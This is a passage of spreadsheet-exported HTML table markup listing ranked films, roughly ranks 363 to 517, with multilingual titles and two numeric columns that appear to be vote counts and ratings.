align="right">74</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">363</td> <td class="xl65">Apocalypse Now</td> <td class="xl66" align="right">21512</td> <td class="xl66" align="right">83</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">364</td> <td class="xl65">Full Metal Jacket</td> <td class="xl66" align="right">21281</td> <td class="xl66" align="right">84</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">365</td> <td class="xl63">麦兜，菠萝油王子</td> <td class="xl66" align="right">21811</td> <td class="xl66" align="right">79</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">366</td> <td class="xl63">阿郎的故事</td> <td class="xl66" align="right">21179</td> <td class="xl66" align="right">84</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">367</td> <td class="xl65">Taxi</td> <td class="xl66" align="right">21659</td> <td class="xl66" align="right">79</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">368</td> <td class="xl65">Meet Joe Black</td> <td class="xl66" align="right">21502</td> <td class="xl66" align="right">78</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">369</td> <td class="xl65">The School of Rock</td> <td class="xl66" align="right">21551</td> <td class="xl66" align="right">77</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">370</td> <td class="xl65">The Talented Mr. Ripley</td> <td class="xl66" align="right">20748</td> <td class="xl66" align="right">82</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">371</td> <td class="xl65">Rear Window</td> <td class="xl66" align="right">20532</td> <td class="xl66" align="right">83</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">372</td> <td class="xl65">8月의 크리스마스</td> <td class="xl66" align="right">20975</td> <td class="xl66" align="right">78</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">373</td> <td class="xl63">赌侠</td> <td class="xl66" align="right">21571</td> <td class="xl66" align="right">71</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">374</td> <td class="xl65">Home Alone 3</td> <td class="xl66" align="right">21083</td> <td class="xl66" align="right">75</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">375</td> <td class="xl65">Back to the Future</td> <td class="xl66" align="right">20138</td> <td class="xl66" align="right">83</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">376</td> <td class="xl65">Mona Lisa Smile</td> <td class="xl66" align="right">20893</td> <td class="xl66" align="right">76</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">377</td> <td class="xl63">黃飛鴻之二男兒當自強</td> <td class="xl66" align="right">20814</td> <td class="xl66" align="right">76</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">378</td> <td class="xl63">黑社会</td> <td class="xl66" align="right">20886</td> <td class="xl66" align="right">75</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">379</td> <td class="xl65">태극기 휘날리며</td> <td class="xl66" align="right">20170</td> <td class="xl66" align="right">81</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">380</td> <td class="xl63">倩女幽魂Ⅱ人间道</td> <td class="xl66" align="right">20913</td> <td class="xl66" align="right">74</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">381</td> <td class="xl63">阮玲玉</td> <td class="xl66" align="right">19888</td> <td class="xl66" align="right">83</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">382</td> <td class="xl63">我的兄弟姐妹</td> <td class="xl66" align="right">20982</td> <td class="xl66" align="right">72</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">383</td> <td class="xl65">Goodfellas</td> <td class="xl66" align="right">19671</td> <td class="xl66" align="right">83</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">384</td> <td class="xl65">Shark Tale</td> <td class="xl66" align="right">21074</td> <td class="xl66" align="right">70</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">385</td> <td class="xl65">The Weather Man</td> <td class="xl66" align="right">20351</td> <td class="xl66" align="right">75</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">386</td> <td class="xl63">堕落天使</td> <td class="xl66" align="right">19933</td> <td class="xl66" align="right">78</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">387</td> <td class="xl65">The Negotiator</td> <td class="xl66" align="right">19390</td> <td class="xl66" align="right">82</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">388</td> <td class="xl65">Eyes Wide Shut</td> <td class="xl66" align="right">20278</td> <td class="xl66" align="right">74</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">389</td> <td class="xl65">8 Mile</td> <td class="xl66" align="right">19690</td> <td class="xl66" align="right">79</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">390</td> <td class="xl65">Erin Brockovich</td> <td class="xl66" align="right">19439</td> <td class="xl66" align="right">81</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">391</td> <td class="xl63">赌神</td> <td class="xl66" align="right">19758</td> <td class="xl66" align="right">77</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">392</td> <td class="xl65">Snow White and the Seven Dwarfs</td> <td class="xl66" align="right">19502</td> <td class="xl66" align="right">79</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">393</td> <td class="xl65">Broken Arrow</td> <td class="xl66" align="right">20319</td> <td class="xl66" align="right">71</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">394</td> <td class="xl63">秋菊打官司</td> <td class="xl66" align="right">19551</td> <td class="xl66" align="right">76</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">395</td> <td class="xl65">Training Day</td> <td class="xl66" align="right">19251</td> <td class="xl66" align="right">78</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">396</td> <td class="xl63">和你在一起</td> <td class="xl66" align="right">19489</td> <td class="xl66" align="right">75</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">397</td> <td class="xl63">红河谷</td> <td class="xl66" align="right">19476</td> <td class="xl66" align="right">75</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">398</td> <td class="xl65">Red Dragon</td> <td class="xl66" align="right">19312</td> <td class="xl66" align="right">75</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">399</td> <td class="xl65">My Fair Lady</td> <td class="xl66" align="right">18737</td> <td class="xl66" align="right">79</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">400</td> <td class="xl65">Aladdin</td> <td class="xl66" align="right">18712</td> <td class="xl66" align="right">79</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">401</td> <td class="xl63">新不了情</td> <td class="xl66" align="right">18326</td> <td class="xl66" align="right">82</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">402</td> <td class="xl63">精武英雄</td> <td class="xl66" align="right">18659</td> <td class="xl66" align="right">79</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">403</td> <td class="xl63">半生缘</td> <td class="xl66" align="right">19057</td> <td class="xl66" align="right">75</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">404</td> <td class="xl65">Swordfish</td> <td class="xl66" align="right">19212</td> <td class="xl66" align="right">73</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">405</td> <td class="xl63">鬼影</td> <td class="xl66" align="right">18621</td> <td class="xl66" align="right">78</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">406</td> <td class="xl65">The Bone Collector</td> <td class="xl66" align="right">19032</td> <td class="xl66" align="right">74</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">407</td> <td class="xl65">Star Wars: Episode I - The Phantom Menace</td> <td class="xl66" align="right">18337</td> <td class="xl66" align="right">79</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">408</td> <td class="xl65">Primal Fear</td> <td class="xl66" align="right">17976</td> <td class="xl66" align="right">82</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">409</td> <td class="xl65">Johnny English</td> <td class="xl66" align="right">18826</td> <td class="xl66" align="right">74</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">410</td> <td class="xl65">Die Hard</td> <td class="xl66" align="right">18150</td> <td class="xl66" align="right">80</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">411</td> <td class="xl65">The Last Samurai</td> <td class="xl66" align="right">18675</td> <td class="xl66" align="right">75</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">412</td> <td class="xl63">紅番區</td> <td class="xl66" align="right">19068</td> <td class="xl66" align="right">71</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">413</td> <td class="xl65">Star Wars: Episode III - Revenge of the Sith</td> <td class="xl66" align="right">18034</td> <td class="xl66" align="right">79</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">414</td> <td class="xl63">金鸡</td> <td class="xl66" align="right">17850</td> <td class="xl66" align="right">80</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">415</td> <td class="xl65">The Lion King II: Simba's Pride</td> <td class="xl66" align="right">18237</td> <td class="xl66" align="right">76</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">416</td> <td class="xl63">暗花</td> <td class="xl66" align="right">17335</td> <td class="xl66" align="right">83</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">417</td> <td class="xl63">洗澡</td> <td class="xl66" align="right">17627</td> <td class="xl66" align="right">80</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">418</td> <td class="xl63">秋天的童話</td> <td class="xl66" align="right">17274</td> <td class="xl66" align="right">82</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">419</td> <td class="xl63">和平饭店</td> <td class="xl66" align="right">17896</td> <td class="xl66" align="right">75</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">420</td> <td class="xl65">Death on the Nile</td> <td class="xl66" align="right">16881</td> <td class="xl66" align="right">84</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">421</td> <td class="xl65">Armageddon</td> <td class="xl66" align="right">17646</td> <td class="xl66" align="right">77</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">422</td> <td class="xl65">Donnie Darko</td> <td class="xl66" align="right">17718</td> <td class="xl66" align="right">76</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">423</td> <td class="xl63">キッズ・リターン</td> <td class="xl66" align="right">16786</td> <td class="xl66" align="right">84</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">424</td> <td class="xl65">A计划</td> <td class="xl66" align="right">17638</td> <td class="xl66" align="right">75</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">425</td> <td class="xl65">Gone in 60 Seconds</td> <td class="xl66" align="right">17856</td> <td class="xl66" align="right">73</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">426</td> <td class="xl65">Bathing Beauty</td> <td class="xl66" align="right">16521</td> <td class="xl66" align="right">84</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">427</td> <td class="xl65">Diarios de motocicleta</td> <td class="xl66" align="right">16515</td> <td class="xl66" align="right">84</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">428</td> <td class="xl63">那山、那人、那狗</td> <td class="xl66" align="right">16728</td> <td class="xl66" align="right">82</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">429</td> <td class="xl65">Mystic River</td> <td class="xl66" align="right">17138</td> <td class="xl66" align="right">78</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">430</td> <td class="xl65">Jaws</td> <td class="xl66" align="right">17353</td> <td class="xl66" align="right">76</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">431</td> <td class="xl65">The Little Mermaid</td> <td class="xl66" align="right">16638</td> <td class="xl66" align="right">81</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">432</td> <td class="xl65">Raiders of the Lost Ark</td> <td class="xl66" align="right">16813</td> <td class="xl66" align="right">79</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">433</td> <td class="xl63">我爱你</td> <td class="xl66" align="right">17780</td> <td class="xl66" align="right">70</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">434</td> <td class="xl65">My Own Private Idaho</td> <td class="xl66" align="right">16519</td> <td class="xl66" align="right">81</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">435</td> <td class="xl63">方世玉续集</td> <td class="xl66" align="right">17259</td> <td class="xl66" align="right">74</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">436</td> <td class="xl63">英雄本色2</td> <td class="xl66" align="right">16545</td> <td class="xl66" align="right">80</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">437</td> <td class="xl65">Romeo + Juliet</td> <td class="xl66" align="right">17309</td> <td class="xl66" align="right">71</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">438</td> <td class="xl63">男人四十</td> <td class="xl66" align="right">16442</td> <td class="xl66" align="right">78</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">439</td> <td class="xl63">金枝玉叶</td> <td class="xl66" align="right">15990</td> <td class="xl66" align="right">81</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">440</td> <td class="xl65">Mindhunters</td> <td class="xl66" align="right">16543</td> <td class="xl66" align="right">76</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">441</td> <td class="xl65">37°2 le matin</td> <td class="xl66" align="right">15977</td> <td class="xl66" align="right">81</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">442</td> <td class="xl65">Star Wars: Episode II - Attack of the Clones</td> <td class="xl66" align="right">16289</td> <td class="xl66" align="right">78</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">443</td> <td class="xl65">Kramer vs. Kramer</td> <td class="xl66" align="right">15575</td> <td class="xl66" align="right">84</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">444</td> <td class="xl63">白发魔女传</td> <td class="xl66" align="right">16414</td> <td class="xl66" align="right">75</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">445</td> <td class="xl65">First Blood</td> <td class="xl66" align="right">15722</td> <td class="xl66" align="right">80</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">446</td> <td class="xl65">Boys Don't Cry</td> <td class="xl66" align="right">15546</td> <td class="xl66" align="right">81</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">447</td> <td class="xl63">红樱桃</td> <td class="xl66" align="right">16203</td> <td class="xl66" align="right">74</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">448</td> <td class="xl65">Die Hard: With a Vengeance</td> <td class="xl66" align="right">15751</td> <td class="xl66" align="right">78</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">449</td> <td class="xl65">장화, 홍련</td> <td class="xl66" align="right">16284</td> <td class="xl66" align="right">73</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">450</td> <td class="xl63">中南海保镖</td> <td class="xl66" align="right">16497</td> <td class="xl66" align="right">71</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">451</td> <td class="xl65">사마리아</td> <td class="xl66" align="right">15880</td> <td class="xl66" align="right">76</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">452</td> <td class="xl63">黄河绝恋</td> <td class="xl66" align="right">16078</td> <td class="xl66" align="right">74</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">453</td> <td class="xl63">新少林五祖</td> <td class="xl66" align="right">16130</td> <td class="xl66" align="right">73</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">454</td> <td class="xl65">La pianiste</td> <td class="xl66" align="right">16017</td> <td class="xl66" align="right">74</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">455</td> <td class="xl63">卡拉是条狗</td> <td class="xl66" align="right">16430</td> <td class="xl66" align="right">70</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">456</td> <td class="xl63">大丈夫</td> <td class="xl66" align="right">15872</td> <td class="xl66" align="right">75</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">457</td> <td class="xl65">Rebecca</td> <td class="xl66" align="right">15090</td> <td class="xl66" align="right">82</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">458</td> <td class="xl63">金玉滿堂</td> <td class="xl66" align="right">15638</td> <td class="xl66" align="right">77</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">459</td> <td class="xl65">Citizen Kane</td> <td class="xl66" align="right">14841</td> <td class="xl66" align="right">84</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">460</td> <td class="xl65">Delicatessen</td> <td class="xl66" align="right">15167</td> <td class="xl66" align="right">81</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">461</td> <td class="xl63">游园惊梦</td> <td class="xl66" align="right">15931</td> <td class="xl66" align="right">74</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">462</td> <td class="xl65">Donnie Brasco</td> <td class="xl66" align="right">15227</td> <td class="xl66" align="right">80</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">463</td> <td class="xl63">回魂夜</td> <td class="xl66" align="right">15666</td> <td class="xl66" align="right">75</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">464</td> <td class="xl63">紫日</td> <td class="xl66" align="right">15317</td> <td class="xl66" align="right">78</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">465</td> <td class="xl65">The Aviator</td> <td class="xl66" align="right">15578</td> <td class="xl66" align="right">75</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">466</td> <td class="xl65">Peter Pan</td> <td class="xl66" align="right">14930</td> <td class="xl66" align="right">80</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">467</td> <td class="xl65">Man on Fire</td> <td class="xl66" align="right">14787</td> <td class="xl66" align="right">81</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">468</td> <td class="xl65">White Chicks</td> <td class="xl66" align="right">15870</td> <td class="xl66" align="right">71</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">469</td> <td class="xl63">推手</td> <td class="xl66" align="right">14441</td> <td class="xl66" align="right">82</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">470</td> <td class="xl65">Vanilla Sky</td> <td class="xl66" align="right">15609</td> <td class="xl66" align="right">71</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">471</td> <td class="xl65">Somewhere in Time</td> <td class="xl66" align="right">14758</td> <td class="xl66" align="right">78</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">472</td> <td class="xl65">Star Wars</td> <td class="xl66" align="right">14303</td> <td class="xl66" align="right">82</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">473</td> <td class="xl65">28 Days Later...</td> <td class="xl66" align="right">15360</td> <td class="xl66" align="right">72</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">474</td> <td class="xl65">The Age of Innocence</td> <td class="xl66" align="right">14349</td> <td class="xl66" align="right">81</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">475</td> <td class="xl65">97家有喜事</td> <td class="xl66" align="right">15233</td> <td class="xl66" align="right">73</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">476</td> <td class="xl65">Aliens</td> <td class="xl66" align="right">14782</td> <td class="xl66" align="right">77</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">477</td> <td class="xl65">The Polar Express</td> <td class="xl66" align="right">15108</td> <td class="xl66" align="right">74</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">478</td> <td class="xl63">倩女幽魂Ⅲ道道道</td> <td class="xl66" align="right">15401</td> <td class="xl66" align="right">71</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">479</td> <td class="xl65">Lolita</td> <td class="xl66" align="right">14598</td> <td class="xl66" align="right">77</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">480</td> <td class="xl65">Indiana Jones and the Last Crusade</td> <td class="xl66" align="right">13992</td> <td class="xl66" align="right">82</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">481</td> <td class="xl65">Top Gun</td> <td class="xl66" align="right">14764</td> <td class="xl66" align="right">75</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">482</td> <td class="xl65">Gangs of New York</td> <td class="xl66" align="right">14952</td> <td class="xl66" align="right">72</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">483</td> <td class="xl65">섬</td> <td class="xl66" align="right">15058</td> <td class="xl66" align="right">71</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">484</td> <td class="xl65">RoboCop</td> <td class="xl66" align="right">14671</td> <td class="xl66" align="right">74</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">485</td> <td class="xl65">Secret Window</td> <td class="xl66" align="right">14952</td> <td class="xl66" align="right">71</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">486</td> <td class="xl65">What Women Want</td> <td class="xl66" align="right">15016</td> <td class="xl66" align="right">70</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">487</td> <td class="xl65">PTU</td> <td class="xl66" align="right">14208</td> <td class="xl66" align="right">77</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">488</td> <td class="xl65">Amores perros</td> <td class="xl66" align="right">13483</td> <td class="xl66" align="right">83</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">489</td> <td class="xl65">EuroTrip</td> <td class="xl66" align="right">14755</td> <td class="xl66" align="right">71</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">490</td> <td class="xl65">Baby's Day Out</td> <td class="xl66" align="right">13589</td> <td class="xl66" align="right">81</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">491</td> <td class="xl63">一声叹息</td> <td class="xl66" align="right">14386</td> <td class="xl66" align="right">72</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">492</td> <td class="xl63">香港制造</td> <td class="xl66" align="right">13351</td> <td class="xl66" align="right">81</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">493</td> <td class="xl65">Collateral</td> <td class="xl66" align="right">14331</td> <td class="xl66" align="right">72</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">494</td> <td class="xl65">Sex, Lies, and Videotape</td> <td class="xl66" align="right">13822</td> <td class="xl66" align="right">76</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">495</td> <td class="xl65">Die Hard 2</td> <td class="xl66" align="right">13678</td> <td class="xl66" align="right">77</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">496</td> <td class="xl65">Wall Street</td> <td class="xl66" align="right">13223</td> <td class="xl66" align="right">81</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">497</td> <td class="xl65">Ju-on: The Grudge 2</td> <td class="xl66" align="right">14094</td> <td class="xl66" align="right">72</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">498</td> <td class="xl65">Murder on the Orient Express</td> <td class="xl66" align="right">12794</td> <td class="xl66" align="right">83</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">499</td> <td class="xl65">A Lot Like Love</td> <td class="xl66" align="right">13335</td> <td class="xl66" align="right">78</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">500</td> <td class="xl63">笑傲江湖</td> <td class="xl66" align="right">13390</td> <td class="xl66" align="right">77</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">501</td> <td class="xl63">梁祝</td> <td class="xl66" align="right">13600</td> <td class="xl66" align="right">75</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">502</td> <td class="xl63">あの夏、いちばん静かな海</td> <td class="xl66" align="right">12768</td> <td class="xl66" align="right">82</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">503</td> <td class="xl65">Kingdom of Heaven</td> <td class="xl66" align="right">13189</td> <td class="xl66" align="right">78</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">504</td> <td class="xl65">GoldenEye</td> <td class="xl66" align="right">13572</td> <td class="xl66" align="right">74</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">505</td> <td class="xl65">The Patriot</td> <td class="xl66" align="right">12902</td> <td class="xl66" align="right">80</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">506</td> <td class="xl63">雙龍會</td> <td class="xl66" align="right">13717</td> <td class="xl66" align="right">72</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">507</td> <td class="xl65">Contact</td> <td class="xl66" align="right">12242</td> <td class="xl66" align="right">83</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">508</td> <td class="xl65">Cleopatra</td> <td class="xl66" align="right">12977</td> <td class="xl66" align="right">76</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">509</td> <td class="xl65">Dark City</td> <td class="xl66" align="right">12643</td> <td class="xl66" align="right">79</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">510</td> <td class="xl65">Hide and Seek</td> <td class="xl66" align="right">13251</td> <td class="xl66" align="right">73</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">511</td> <td class="xl65">The Thirteenth Floor</td> <td class="xl66" align="right">12321</td> <td class="xl66" align="right">81</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">512</td> <td class="xl65">North by Northwest</td> <td class="xl66" align="right">12287</td> <td class="xl66" align="right">81</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">513</td> <td class="xl63">监狱风云</td> <td class="xl66" align="right">12459</td> <td class="xl66" align="right">79</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">514</td> <td class="xl65">The Passion of the Christ</td> <td class="xl66" align="right">12639</td> <td class="xl66" align="right">77</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">515</td> <td class="xl65">Cinderella</td> <td class="xl66" align="right">12298</td> <td class="xl66" align="right">80</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">516</td> <td class="xl65">Firelight</td> <td class="xl66" align="right">12399</td> <td class="xl66" align="right">79</td> </tr> <tr style="height: 12.75pt"> <td style="height: 12.75pt" class="xl65" height="17">517</td> <td 